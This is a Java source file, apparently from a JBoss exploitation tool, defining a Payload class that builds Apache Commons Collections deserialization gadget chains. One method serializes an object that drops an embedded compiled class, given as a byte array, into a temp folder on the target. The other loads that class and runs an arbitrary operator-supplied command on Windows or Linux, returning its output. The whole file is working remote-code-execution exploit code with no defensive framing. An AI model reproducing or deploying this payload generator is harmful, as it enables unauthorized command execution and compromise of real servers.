package com.jboss.main;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.SynchronizedSortedBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.set.SynchronizedSet;

public class Payload {
	@SuppressWarnings ( {"unchecked"} )
	public byte[] upload(String os) throws Exception, Exception {
		
		
		  String TempFilePath = "c:/windows/temp/RunCheckConfig.class";
		    if (os.equals("Linux")) {
		      TempFilePath = "/tmp/RunCheckConfig.class";
		    }
		 byte[] Classofbyte = {-54,-2,-70,-66,0,0,0,50,0,94,7,0,2,1,0,14,82,117,110,67,104,101,99,107,67,111,110,102,105,103,7,0,4,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,6,60,105,110,105,116,62,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,10,69,120,99,101,112,116,105,111,110,115,7,0,9,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,1,0,4,67,111,100,101,10,0,3,0,12,12,0,5,0,13,1,0,3,40,41,86,7,0,15,1,0,22,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,10,0,14,0,12,7,0,18,1,0,12,106,97,118,97,47,105,111,47,70,105,108,101,8,0,20,1,0,25,47,116,109,112,47,82,117,110,67,104,101,99,107,67,111,110,102,105,103,46,99,108,97,115,115,10,0,17,0,22,12,0,5,0,6,10,0,17,0,24,12,0,25,0,26,1,0,6,101,120,105,115,116,115,1,0,3,40,41,90,8,0,28,1,0,11,91,76,50,57,49,57,49,57,93,13,10,10,0,14,0,30,12,0,31,0,32,1,0,6,97,112,112,101,110,100,1,0,44,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,8,0,34,1,0,11,91,87,50,57,49,48,49,51,93,13,10,10,0,36,0,38,7,0,37,1,0,17,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,12,0,39,0,40,1,0,10,103,101,116,82,117,110,116,105,109,101,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,59,10,0,36,0,42,12,0,43,0,44,1,0,4,101,120,101,99,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,7,0,46,1,0,22,106,97,118,97,47,105,111,47,66,117,102,102,101,114,101,100,82,101,97,100,101,114,7,0,48,1,0,25,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,82,101,97,100,101,114,10,0,50,0,52,7,0,51,1,0,17,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,12,0,53,0,54,1,0,14,103,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,23,40,41,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,10,0,47,0,56,12,0,5,0,57,1,0,24,40,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,41,86,10,0,45,0,59,12,0,5,0,60,1,0,19,40,76,106,97,118,97,47,105,111,47,82,101,97,100,101,114,59,41,86,8,0,62,1,0,1,10,10,0,45,0,64,12,0,65,0,66,1,0,8,114,101,97,100,76,105,110,101,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,10,0,14,0,68,12,0,69,0,66,1,0,8,116,111,83,116,114,105,110,103,10,0,8,0,22,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,16,76,82,117,110,67,104,101,99,107,67,111,110,102,105,103,59,1,0,8,112,97,114,97,109,99,109,100,1,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,17,108,111,99,97,108,83,116,114,105,110,103,66,117,102,102,101,114,1,0,24,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,1,0,4,102,105,108,101,1,0,14,76,106,97,118,97,47,105,111,47,70,105,108,101,59,1,0,12,108,111,99,97,108,80,114,111,99,101,115,115,1,0,19,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,1,0,19,108,111,99,97,108,66,117,102,102,101,114,101,100,82,101,97,100,101,114,1,0,24,76,106,97,118,97,47,105,111,47,66,117,102,102,101,114,101,100,82,101,97,100,101,114,59,1,0,4,115,116,114,49,1,0,4,115,116,114,50,1,0,14,108,111,99,97,108,69,120,99,101,112,116,105,111,110,1,0,21,76,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,59,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,7,0,91,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,19,82,117,110,67,104,101,99,107,67,111,110,102,105,103,46,106,97,118,97,0,33,0,1,0,3,0,0,0,0,0,1,0,1,0,5,0,6,0,2,0,7,0,0,0,4,0,1,0,8,0,10,0,0,1,61,0,5,0,9,0,0,0,122,42,-73,0,11,-69,0,14,89,-73,0,16,77,-69,0,17,89,18,19,-73,0,21,78,45,-74,0,23,-103,0,13,44,18,27,-74,0,29,87,-89,0,10,44,18,33,-74,0,29,87,-72,0,35,43,-74,0,41,58,4,-69,0,45,89,-69,0,47,89,25,4,-74,0,49,-73,0,55,-73,0,58,58,5,-89,0,15,44,25,6,-74,0,29,18,61,-74,0,29,87,25,5,-74,0,63,89,58,6,-57,-1,-20,44,-74,0,67,58,7,-69,0,8,89,25,7,-73,0,70,58,8,25,8,-65,0,0,0,3,0,71,0,0,0,26,0,6,0,0,0,8,0,4,0,9,0,12,0,10,0,46,0,11,0,76,0,13,0,102,0,14,0,72,0,0,0,102,0,10,0,0,0,122,0,73,0,74,0,0,0,0,0,122,0,75,0,76,0,1,0,12,0,110,0,77,0,78,0,2,0,22,0,100,0,79,0,80,0,3,0,55,0,67,0,81,0,82,0,4,0,76,0,46,0,83,0,84,0,5,0,79,0,12,0,85,0,76,0,6,0,99,0,23,0,85,0,76,0,6,0,108,0,14,0,86,0,76,0,7,0,119,0,3,0,87,0,88,0,8,0,89,0,0,0,37,0,4,-1,0,39,0,4,7,0,1,7,0,90,7,0,14,7,0,17,0,0,6,-2,0,32,7,0,50,7,0,45,7,0,90,-6,0,11,0,1,0,92,0,0,0,2,0,93};
		Transformer[] transformers = new Transformer[] {
				 new ConstantTransformer(FileOutputStream.class),
		            new InvokerTransformer("getConstructor",
		                    new Class[] { Class[].class },
		                    new Object[] { new Class[] { String.class } }),
		            new InvokerTransformer("newInstance",
		                    new Class[] { Object[].class },
		                    new Object[] { new Object[] { TempFilePath } }),
		            new InvokerTransformer("write", new Class[] { byte[].class },
		                    new Object[] { Classofbyte }),
		            new ConstantTransformer(1) };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map map1 = new HashMap();
        Map lazyMap = LazyMap.decorate(map1,transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        // Serializa o objeto
//        System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
//        FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
//        ObjectOutputStream oos = new ObjectOutputStream(fos);
//        oos.writeObject(map);
//        oos.flush();
        ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
        ObjectOutputStream out = new ObjectOutputStream(bo);
        out.writeObject(map);
        out.flush();
        out.close();
        return bo.toByteArray();
		
	}
	public byte[] PayloadGeneration(String cmd,String os) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
    IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException, NoSuchFieldException {
		
			    String ClassPath = "file:/c:/windows/temp/";
			    
			    if (os.equals("linux")) {
			      ClassPath = "file:/tmp/";
			    }
			    if (os.equals("linux"))
		            cmd =cmd;
		        else
		            cmd = "cmd.exe /c "+cmd;
			    
			    System.out.println(cmd);
				 Transformer[] transformers = {
					      new ConstantTransformer(URLClassLoader.class), 
					      
					      new InvokerTransformer("getConstructor", 
					    		  new Class[] {Class[].class}, new Object[] {
					    				  new Class[]{java.net.URL[].class}}), 
					      
					      new InvokerTransformer(
					      "newInstance", 
					      new Class[] {
					    		  Object[].class}, new Object[] { new Object[] { new java.net.URL[] { 
					    
								   new java.net.URL(ClassPath)
					    			
					    		  }}}), 
					      
					      new InvokerTransformer("loadClass", 
					      new Class[] { String.class }, new Object[] { "RunCheckConfig" }), 
					      
					      new InvokerTransformer("getConstructor", 
					      new Class[] { Class[].class }, 
					      new Object[] { new Class[]{ String.class } }), 
					      
					      new InvokerTransformer("newInstance", 
					      new Class[] { Object[].class }, 
					      new Object[] { new String[]{ cmd } }) };//执行 带回
	        Transformer transformerChain = new ChainedTransformer(transformers);
	        Map map1 = new HashMap();
	        Map lazyMap = LazyMap.decorate(map1,transformerChain);
	        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
	        HashSet map = new HashSet(1);
	        map.add("foo");
	        Field f = null;
	        try {
	            f = HashSet.class.getDeclaredField("map");
	        } catch (NoSuchFieldException e) {
	            f = HashSet.class.getDeclaredField("backingMap");
	        }
	        f.setAccessible(true);
	        HashMap innimpl = (HashMap) f.get(map);
	        Field f2 = null;
	        try {
	            f2 = HashMap.class.getDeclaredField("table");
	        } catch (NoSuchFieldException e) {
	            f2 = HashMap.class.getDeclaredField("elementData");
	        }

	        f2.setAccessible(true);
	        Object[] array = (Object[]) f2.get(innimpl);

	        Object node = array[0];
	        if(node == null){
	            node = array[1];
	        }

	        Field keyField = null;
	        try{
	            keyField = node.getClass().getDeclaredField("key");
	        }catch(Exception e){
	            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
	        }

	        keyField.setAccessible(true);
	        keyField.set(node, entry);

	        // Serializa o objeto
//	        System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
//	        FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
//	        ObjectOutputStream oos = new ObjectOutputStream(fos);
//	        oos.writeObject(map);
//	        oos.flush();
	        ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
	        ObjectOutputStream out = new ObjectOutputStream(bo);
	        out.writeObject(map);
	        out.flush();
	        out.close();
	        return bo.toByteArray();
	       
	    }
	}
